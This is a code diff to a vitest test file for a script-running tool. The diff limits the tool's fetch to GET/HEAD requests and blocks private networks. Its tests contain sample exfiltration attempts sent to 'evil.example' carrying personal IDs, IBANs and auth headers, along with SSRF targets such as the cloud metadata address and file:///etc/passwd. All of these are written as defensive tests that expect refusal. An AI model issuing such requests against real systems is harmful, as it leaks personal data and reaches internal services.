@@ -1,5 +1,12 @@
-import { describe, expect, it } from 'vitest';
+import { describe, expect, it, vi } from 'vitest';
 import { runScript, runScriptTool } from '../src/tools/run-script';
+
+// Offline DNS: intranet.example resolves to a private address, every other name to a public one.
+vi.mock('node:dns/promises', () => ({
+  lookup: async (host: string) => [
+    { address: host === 'intranet.example' ? '10.0.0.5' : '93.184.216.34', family: 4 },
+  ],
+}));
 
 function jsonResponse(body: unknown, init: ResponseInit = {}): Response {
   return new Response(JSON.stringify(body), {
@@ -29,18 +36,16 @@ describe('runScript', () => {
     expect(run).toMatchObject({ ok: true, logs: ['2'], result: undefined });
   });
 
-  it('fetches through the host with method, headers and body', async () => {
+  it('fetches through the host with GET and the allowed headers', async () => {
     const calls: Array<{ url: string; init: RequestInit }> = [];
-    const fetchImpl = (async (url: string, init: RequestInit) => {
-      calls.push({ url, init });
+    const fetchImpl = (async (url: URL, init: RequestInit) => {
+      calls.push({ url: String(url), init });
       return jsonResponse({ offices: ['Madrid', 'Sevilla'] }, { status: 201 });
     }) as unknown as typeof fetch;
     const run = await runScript(
       `
-      const res = await fetch('https://api.example.es/oficinas', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ province: 'Madrid' }),
+      const res = await fetch('https://api.example.es/oficinas?provincia=Madrid', {
+        headers: { Accept: 'application/json', 'Accept-Language': 'es' },
       });
       const data = await res.json();
       return { status: res.status, ok: res.ok, type: res.headers.get('Content-Type'), offices: data.offices };
@@ -55,12 +60,110 @@ describe('runScript', () => {
       offices: ['Madrid', 'Sevilla'],
     });
     expect(run.fetches).toBe(1);
-    expect(calls[0]?.url).toBe('https://api.example.es/oficinas');
-    expect(calls[0]?.init.method).toBe('POST');
-    expect(calls[0]?.init.body).toBe('{"province":"Madrid"}');
+    expect(calls[0]?.url).toBe('https://api.example.es/oficinas?provincia=Madrid');
+    expect(calls[0]?.init).toMatchObject({ method: 'GET', redirect: 'manual' });
+    expect(calls[0]?.init.body).toBeUndefined();
     const headers = new Headers(calls[0]?.init.headers);
-    expect(headers.get('content-type')).toBe('application/json');
+    expect(headers.get('accept')).toBe('application/json');
+    expect(headers.get('accept-language')).toBe('es');
     expect(headers.get('user-agent')).toMatch(/Mozilla/);
+  });
+
+  it('refuses other methods, request bodies and other headers', async () => {
+    const fetchImpl = vi.fn(async () => jsonResponse({})) as unknown as typeof fetch;
+    const run = await runScript(
+      `
+      const attempts = [
+        ['https://evil.example/', { method: 'POST' }],
+        ['https://evil.example/', { method: 'put' }],
+        ['https://evil.example/', { body: 'DNI 12345678Z' }],
+        ['https://evil.example/', { method: 'POST', body: new URLSearchParams({ iban: 'ES00' }) }],
+        ['https://evil.example/', { headers: { 'X-Data': 'DNI 12345678Z' } }],
+        ['https://evil.example/', { headers: { Authorization: 'Bearer x' } }],
+      ];
+      const errors = [];
+      for (const [url, init] of attempts) {
+        try { await fetch(url, init); errors.push('sent'); } catch (e) { errors.push(e.message); }
+      }
+      return errors;
+    `,
+      { fetchImpl },
+    );
+    expect(JSON.parse(run.result ?? '')).toEqual([
+      'Only GET and HEAD requests are allowed, not POST',
+      'Only GET and HEAD requests are allowed, not PUT',
+      'fetch cannot send a request body: only GET and HEAD are allowed',
+      'fetch cannot send a request body: only GET and HEAD are allowed',
+      'Header x-data is not allowed: only accept and accept-language',
+      'Header authorization is not allowed: only accept and accept-language',
+    ]);
+    expect(fetchImpl).not.toHaveBeenCalled();
+  });
+
+  it('blocks localhost and private networks, also behind a redirect', async () => {
+    const calls: string[] = [];
+    const fetchImpl = (async (url: URL) => {
+      calls.push(String(url));
+      return new Response(null, {
+        status: 302,
+        headers: { location: 'http://169.254.169.254/latest/meta-data/' },
+      });
+    }) as unknown as typeof fetch;
+    const run = await runScript(
+      `
+      const urls = [
+        'http://localhost:8080/',
+        'http://127.0.0.1/',
+        'http://192.168.1.1/admin',
+        'http://[::1]/',
+        'https://intranet.example/',
+        'file:///etc/passwd',
+        'https://public.example/go',
+      ];
+      const errors = [];
+      for (const url of urls) {
+        try { await fetch(url); errors.push('fetched'); } catch (e) { errors.push(e.message); }
+      }
+      return errors;
+    `,
+      { fetchImpl },
+    );
+    expect(JSON.parse(run.result ?? '')).toEqual([
+      'Blocked: localhost is a local address',
+      'Blocked: 127.0.0.1 is a private address',
+      'Blocked: 192.168.1.1 is a private address',
+      'Blocked: ::1 is a private address',
+      'Blocked: intranet.example resolves to a private address',
+      'Only http(s) URLs are supported: file:///etc/passwd',
+      'Blocked: 169.254.169.254 is a private address',
+    ]);
+    // Only the public hop went out.
+    expect(calls).toEqual(['https://public.example/go']);
+  });
+
+  it('follows public redirects and reports the final URL', async () => {
+    const fetchImpl = (async (url: URL) =>
+      url.pathname === '/old'
+        ? new Response(null, { status: 301, headers: { location: '/new' } })
+        : new Response('ok')) as unknown as typeof fetch;
+    const run = await runScript(
+      `const res = await fetch('https://x.es/old'); return { url: res.url, redirected: res.redirected, text: await res.text() };`,
+      { fetchImpl },
+    );
+    expect(JSON.parse(run.result ?? '')).toEqual({
+      url: 'https://x.es/new',
+      redirected: true,
+      text: 'ok',
+    });
+  });
+
+  it('reaches private hosts only when allowed (dev/e2e)', async () => {
+    const fetchImpl = (async () => new Response('mock sede')) as unknown as typeof fetch;
+    const run = await runScript(`return await (await fetch('http://localhost:8790/')).text();`, {
+      fetchImpl,
+      allowPrivateHosts: true,
+    });
+    expect(JSON.parse(run.result ?? '')).toBe('mock sede');
   });
 
   it('decodes ISO-8859-1 responses', async () => {
@@ -82,7 +185,7 @@ describe('runScript', () => {
       `try { await fetch('https://nope.invalid'); } catch (e) { return e.message; }`,
       { fetchImpl },
     );
-    expect(JSON.parse(run.result ?? '')).toBe('fetch failed (ENOTFOUND)');
+    expect(JSON.parse(run.result ?? '')).toBe('Could not fetch nope.invalid: ENOTFOUND');
   });
 
   it('reports syntax errors and thrown errors', async () => {
@@ -226,20 +329,18 @@ describe('runScript', () => {
     });
   });
 
-  it('sends and receives binary bodies', async () => {
+  it('receives binary bodies', async () => {
     const pdf = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x00, 0xff, 0x80]);
-    const calls: RequestInit[] = [];
-    const fetchImpl = (async (_url: string, init: RequestInit) => {
-      calls.push(init);
-      return new Response(pdf, { headers: { 'content-type': 'application/pdf' } });
-    }) as unknown as typeof fetch;
+    const fetchImpl = (async () =>
+      new Response(pdf, {
+        headers: { 'content-type': 'application/pdf' },
+      })) as unknown as typeof fetch;
     const run = await runScript(
       `
-      const upload = await fetch(new URL('https://x.es/subir'), { method: 'PUT', body: new Uint8Array([1, 2, 255]) });
-      const form = await fetch('https://x.es/form', { method: 'POST', body: new URLSearchParams({ a: 'b c' }) });
-      const bytes = await upload.bytes();
-      const buffer = await form.arrayBuffer();
-      return { bytes: [...bytes], length: buffer.byteLength, start: (await form.text()).slice(0, 4) };
+      const res = await fetch(new URL('https://x.es/doc.pdf'));
+      const bytes = await res.bytes();
+      const buffer = await res.arrayBuffer();
+      return { bytes: [...bytes], length: buffer.byteLength, start: (await res.text()).slice(0, 4) };
     `,
       { fetchImpl },
     );
@@ -248,11 +349,6 @@ describe('runScript', () => {
       length: pdf.length,
       start: '%PDF',
     });
-    expect([...new Uint8Array(calls[0]?.body as Uint8Array)]).toEqual([1, 2, 255]);
-    expect(calls[1]?.body).toBe('a=b+c');
-    expect(new Headers(calls[1]?.headers).get('content-type')).toBe(
-      'application/x-www-form-urlencoded;charset=UTF-8',
-    );
   });
 
   it('stops busy loops, hung promises and hung requests at the timeout', async () => {
